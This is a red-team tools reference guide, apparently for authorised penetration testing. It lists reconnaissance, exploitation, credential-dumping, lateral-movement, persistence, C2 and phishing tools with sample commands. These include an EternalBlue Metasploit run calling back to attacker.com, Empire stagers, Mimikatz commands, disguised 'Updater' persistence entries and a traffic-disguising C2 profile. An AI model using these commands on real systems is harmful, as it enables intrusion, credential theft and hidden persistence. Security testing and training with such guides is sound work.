# Red Team Tools Reference Guide

## Reconnaissance Tools

### Network Scanning
- **Nmap**
  - Usage: Port scanning, service detection, OS fingerprinting
  - Commands: `nmap -sS -sV -oN scan.txt target.com`
  - Evasion: `-D decoy1,decoy2`, `-f` for packet fragmentation
- **Masscan**
  - Usage: High-speed port scanning of large networks
  - Commands: `masscan -p1-65535 target.com --rate=1000`
  - Notes: Faster than nmap but less feature-rich

### DNS Enumeration
- **DNSenum**
  - Usage: DNS information gathering and zone transfer
  - Commands: `dnsenum target.com`
  - Features: Subdomain enumeration, zone transfer attempts
- **Subfinder**
  - Usage: Passive subdomain discovery
  - Commands: `subfinder -d target.com -o subdomains.txt`
  - Sources: Multiple search engines and certificate transparency

### Web Application Analysis
- **WhatWeb**
  - Usage: Web technology identification
  - Commands: `whatweb target.com --log-verbose=tech.txt`
  - Output: Technology stack, server information, cookies
- **Dirb/Dirbuster**
  - Usage: Directory and file brute forcing
  - Commands: `dirb http://target.com /usr/share/wordlists/common.txt`
  - Purpose: Find hidden directories and files

## Exploitation Tools

### Metasploit Framework
- **Modules**
  - Exploits: `exploit/windows/smb/ms17_010_eternalblue`
  - Payloads: `windows/meterpreter/reverse_tcp`
  - Post-exploitation: `post/windows/gather/enum_applications`
- **Usage Pattern**
  ```bash
  msfconsole
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS target.com
  set LHOST attacker.com
  exploit
  ```

### PowerShell Empire
- **Listeners**
  - HTTP: `sethost http://attacker.com`
  - HTTPS: `sethost https://attacker.com`
  - SMB: `sethost smb://attacker.com`
- **Agents**
  - Stager generation: `launcher powershell http://attacker.com`
  - Agent communication: Encrypted channel with JA3 fingerprinting

### Cobalt Strike
- **Beacon Configuration**
  - HTTP beacons: Standard web traffic
  - DNS beacons: DNS query-based C2
  - SMB beacons: Named pipe communication
- **Malleable C2 Profiles**
  - Custom traffic shaping
  - Domain fronting support
  - User-agent and header customization

## Post-Exploitation Tools

### Credential Harvesting
- **Mimikatz**
  - Usage: Windows credential extraction
  - Commands: `sekurlsa::logonpasswords`, `lsadump::sam`
  - Evasion: Antivirus bypass techniques required
- **LaZagne**
  - Usage: Multi-application credential recovery
  - Commands: `python laZagne.py all`
  - Targets: Browsers, email clients, databases, Git

### Lateral Movement
- **PsExec**
  - Usage: Remote command execution
  - Commands: `psexec \\target.com -u admin -p pass cmd`
  - Detection: Creates new service, generates event logs
- **WMI**
  - Usage: Windows Management Instrumentation
  - Commands: `wmic /node:target.com process call create "cmd.exe"`
  - Evasion: Less noisy than PsExec

### Persistence Mechanisms
- **SchTasks**
  - Usage: Scheduled task creation
  - Commands: `schtasks /create /tn "Updater" /tr "payload.exe" /sc onlogon`
  - Detection: Task Scheduler logs
- **Registry Persistence**
  - Usage: Registry key modification
  - Commands: `reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /d "payload.exe"`
  - Locations: Run keys, Services, Image File Execution Options

## Command and Control

### C2 Frameworks
- **Covenant**
  - Features: .NET-based, reflective loading
  - Communication: HTTP/HTTPS, DNS, SMB
  - Deployment: Cross-platform support
- **Mythic**
  - Features: Agent customization, payload generation
  - Communication: Multiple transport protocols
  - Integration: External tool integration

### Custom C2 Development
- **HTTP C2**
  - GET requests for commands
  - POST requests for data exfiltration
  - Custom headers for authentication
- **DNS C2**
  - TXT record queries for commands
  - Subdomain data encoding
  - DNS over HTTPS support

## Social Engineering Tools

### Phishing Campaigns
- **GoPhish**
  - Features: Campaign management, tracking, reporting
  - Templates: Email template customization
  - Metrics: Open rates, click rates, submission rates
- **King Phisher**
  - Features: Campaign automation, SMS phishing
  - Integration: SMTP servers, SMS gateways
  - Reporting: Detailed analytics and export

### Physical Social Engineering
- **USB Rubber Ducky**
  - Usage: HID device for payload delivery
  - Language: Ducky Script programming
  - Payloads: Reverse shells, credential harvesters
- **Evil Portal**
  - Usage: Rogue access point setup
  - Tools: WiFi Pineapple, ESP8266 devices
  - Captive portal: Credential harvesting interface

## Forensics and Evidence Collection

### Memory Analysis
- **Volatility**
  - Usage: Memory dump analysis
  - Commands: `volatility -f memory.dmp imageinfo`
  - Plugins: Process listing, network connections, malware detection
- **Rekall**
  - Usage: Advanced memory forensics
  - Features: Timeline analysis, artifact extraction
  - Integration: SIEM and threat intelligence platforms

### Network Analysis
- **Wireshark**
  - Usage: Network packet capture and analysis
  - Filters: BPF syntax for traffic filtering
  - Export: PCAP files for evidence preservation
- **TCPdump**
  - Usage: Command-line packet capture
  - Commands: `tcpdump -i eth0 -w capture.pcap host target.com`
  - Analysis: Command-line parsing and filtering

## Tool Configuration Templates

### Metasploit Configuration
```ruby
# Database configuration
require 'msf/core'
require 'msf/core/post/common'

# Global settings
setg ConsoleLogging true
setg TimestampOutput true
setg EnableSessionLogging true

# Payload settings
setg PAYLOAD_GENERATOR true
setg PAYLOAD_UUID_NAMESPACE "redteam"
```

### Empire Configuration
```yaml
# Empire server configuration
listeners:
  http:
    host: 0.0.0.0
    port: 8080
    cert_path: /opt/empire/data/empire.pem
    
agents:
  default_jitter: 0.0
  default_knock_interval: 60
  default_comms_method: http
```

### Cobalt Strike Profile
```c
# Malleable C2 profile
http-get {
    set uri "/api/v1/status";
    
    client {
        header "User-Agent" "Mozilla/5.0";
        metadata {
            base64url;
            parameter "session";
        }
    }
    
    server {
        header "Server" "nginx/1.14.0";
        output {
            base64url;
            print;
        }
    }
}
```

## Tool Selection Guidelines

### Engagement Type Considerations
- **Cooperative Testing**: Full tool disclosure, collaborative approach
- **Adversarial Testing**: Tool evasion, stealth techniques required
- **Compliance Testing**: Documented tool usage, audit trail maintenance

### Environment Constraints
- **Windows Networks**: PowerShell-based tools, AD-specific exploits
- **Linux Environments**: Shell-based tools, privilege escalation techniques
- **Cloud Infrastructure**: API-based attacks, cloud-specific tools

### Detection Capability Assessment
- **Blue Team Sophistication**: Advanced EDR requires living-off-the-land
- **SIEM Integration**: Tool selection based on log generation patterns
- **Network Monitoring**: Encrypted C2 and traffic shaping requirements
